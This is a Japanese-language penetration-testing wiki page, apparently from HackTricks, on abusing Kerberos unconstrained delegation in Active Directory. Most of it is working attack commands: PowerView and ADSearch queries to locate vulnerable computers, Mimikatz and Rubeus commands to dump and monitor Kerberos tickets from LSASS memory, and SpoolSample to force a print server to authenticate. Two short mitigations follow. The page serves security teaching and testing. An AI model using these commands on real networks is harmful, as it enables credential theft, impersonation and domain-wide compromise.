# 制約のない委任

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで企業を宣伝**してみたいですか？または、**PEASSの最新バージョンにアクセス**したいですか、または**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFT](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **ハッキングトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出**してください。

</details>

## 制約のない委任

これは、ドメイン管理者がドメイン内の**任意のコンピュータに設定できる機能**です。その後、**ユーザーがコンピュータにログイン**するたびに、そのユーザーの**TGTのコピー**が**DCによって提供されるTGSに送信され、LSASSのメモリに保存**されます。したがって、そのマシンで管理者特権を持っている場合、**チケットをダンプしてユーザーをなりすます**ことができます。

したがって、ドメイン管理者が「制約のない委任」機能が有効になっているコンピュータにログインし、そのマシンでローカル管理者特権を持っている場合、チケットをダンプしてどこでもドメイン管理者になりすますことができます（ドメイン昇格）。

この属性を持つコンピュータオブジェクトを見つけるには、[userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx)属性が[ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx)を含んでいるかどうかを確認します。これは、powerviewが行う方法です。LDAPフィルター '（userAccountControl:1.2.840.113556.1.4.803:=524288）' を使用してこれを行うことができます。

<pre class="language-bash"><code class="lang-bash"># 制約のないコンピュータのリスト
## Powerview
Get-NetComputer -Unconstrained #DCは常に表示されますが、昇格には役立ちません
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Mimikatzでチケットをエクスポート
</strong>privilege::debug
sekurlsa::tickets /export #推奨される方法
kerberos::list /export #別の方法

# ログインを監視して新しいチケットをエクスポート
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #新しいTGTを10秒ごとにチェック</code></pre>

**Mimikatz**または**Rubeus**を使用して管理者（または被害者ユーザー）のチケットをメモリにロードし、[**Pass the Ticket**](pass-the-ticket.md)を行います。\
詳細情報: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**ired.teamでの制約のない委任に関する詳細情報**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **強制認証**

攻撃者が「制約のない委任」に許可されたコンピュータを**侵害できる**場合、**プリントサーバーをだます**ことで、サーバーのメモリにTGTを**保存**することができます。\
その後、攻撃者は**Pass the Ticket攻撃を実行**して、プリントサーバーのコンピュータアカウントのユーザーをなりすますことができます。

プリントサーバーを任意のマシンにログインさせるには、[**SpoolSample**](https://github.com/leechristensen/SpoolSample)を使用できます。
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
### 対策

* 特定のサービスに対するDA/Adminログインを制限する
* 特権アカウントに対して「アカウントは機密であり、委任できません」を設定する。
